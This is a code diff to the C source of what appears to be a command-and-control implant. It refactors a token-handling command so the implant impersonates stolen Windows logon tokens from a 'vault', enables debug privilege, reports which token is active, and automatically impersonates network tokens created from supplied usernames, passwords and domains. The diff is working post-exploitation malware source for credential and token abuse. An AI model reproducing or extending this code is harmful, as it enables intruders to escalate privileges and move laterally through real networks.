@@ -1238,43 +1238,19 @@ VOID CommandToken( PPARSER Parser )
 
             TokenData = TokenGet( dwTokenID );
 
-            if ( ! TokenData )
+            if ( TokenData )
             {
-                PUTS( "Token not found in vault." )
-                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
-                return;
-            }
-
-            TokenSetPrivilege( SE_DEBUG_NAME, TRUE );
-
-            if ( ! Instance.Win32.RevertToSelf() )
-                CALLBACK_GETLASTERROR
-
-            if ( Instance.Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
-            {
-                Instance.Tokens.Impersonate = TRUE;
-                Instance.Tokens.Token       = TokenData;
-
-                PRINTF( "[+] Successful impersonated: %s\n", TokenData->DomainUser );
-
-                PackageAddInt32( Package, TRUE );
+                PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
+                PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
             }
             else
             {
-                Instance.Tokens.Impersonate = FALSE;
-                Instance.Tokens.Token       = NULL;
-
-                PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );
-
-                CALLBACK_GETLASTERROR
-
+                PUTS( "Token not found in vault." )
+                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                 PackageAddInt32( Package, FALSE );
-
-                if ( ! Instance.Win32.RevertToSelf() )
-                    CALLBACK_GETLASTERROR
+                PackageAddInt32( Package, 0 );
             }
 
-            PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
             break;
         }
 
@@ -1320,6 +1296,7 @@ VOID CommandToken( PPARSER Parser )
                     PackageAddBytes( Package, TokenList->DomainUser, StringLengthA( TokenList->DomainUser ) );
                     PackageAddInt32( Package, TokenList->dwProcessID );
                     PackageAddInt32( Package, TokenList->Type );
+                    PackageAddInt32( Package, Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenList->Handle );
 
                     TokenList = TokenList->NextToken;
                 }
@@ -1401,6 +1378,7 @@ VOID CommandToken( PPARSER Parser )
             LPSTR  BufferPassword = NULL;
             LPSTR  BufferDomain   = NULL;
             DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;
+            DWORD  NewTokenID     = 0;
 
             if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
             {
@@ -1429,7 +1407,7 @@ VOID CommandToken( PPARSER Parser )
                     MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                     MemCopy( BufferDomain, lpDomain, dwDomainSize );
 
-                    TokenAdd(
+                    NewTokenID = TokenAdd(
                         hToken,
                         UserDomain,
                         TOKEN_TYPE_MAKE_NETWORK,
@@ -1438,6 +1416,9 @@ VOID CommandToken( PPARSER Parser )
                         BufferDomain,
                         BufferPassword
                     );
+
+                    // when a new token is created, we impersonate it automatically
+                    ImpersonateTokenFromVault( NewTokenID );
 
                     PRINTF( "UserDomain => %s\n", UserDomain )
 
